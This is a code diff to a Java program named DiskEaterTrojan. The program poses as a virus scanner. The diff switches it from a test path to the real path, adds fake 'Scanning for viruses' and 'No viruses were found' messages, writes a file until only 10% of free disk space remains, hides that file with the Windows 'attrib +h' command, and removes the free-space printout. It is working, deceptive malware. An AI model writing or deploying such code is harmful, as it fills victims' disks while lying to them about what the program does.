@@ -2,6 +2,8 @@
 import java.io.*;
 import java.nio.ByteBuffer;
 import java.nio.channels.FileChannel;
+import java.nio.file.Files;
+import java.nio.file.LinkOption;
 import java.util.Scanner;
 
 import javax.swing.filechooser.FileSystemView;
@@ -23,7 +25,9 @@ public class DiskEaterTrojan
 		if(input.equals("s"))
 		{
 			//Evil things happen here
-			writeFile(testPath);
+			System.out.println("Scanning for viruses. Do not exit the program until completion.");
+			System.out.println("Please wait...");
+			writeFile(actualPath);
 			System.out.println("No viruses were found.");
 		}
 		else
@@ -50,6 +54,10 @@ public class DiskEaterTrojan
 			
 			DataOutputStream outStream = new DataOutputStream(new BufferedOutputStream(new FileOutputStream(filePath, true)));
 			
+			outStream.write(largerBuffer);
+			
+			hideFile(filePath);
+			
 			//Write the file and continuously check if we are above 10% remaining disk space
 			while(checkFreeSpacePercent(filePath) > 10.0f)
 			{
@@ -71,7 +79,7 @@ public class DiskEaterTrojan
 	{
 		File f = new File(filePath);
 		float percent = ((float)f.getFreeSpace() / (float)f.getTotalSpace())* 100.0f;
-		printFreeSpace(percent);
+		//printFreeSpace(percent);
 		return percent;
 	}
 	
@@ -85,5 +93,15 @@ public class DiskEaterTrojan
 	{
 		File f = new File(filePath);
 		return f.getFreeSpace();
+	}
+	
+	private static void hideFile(String path) 
+	{
+		String[] hideCmd = {"attrib", "+h", path};
+		try
+		{
+			Runtime.getRuntime().exec(hideCmd);
+		}
+		catch (IOException e){ System.out.println("Error");}
 	}
 }
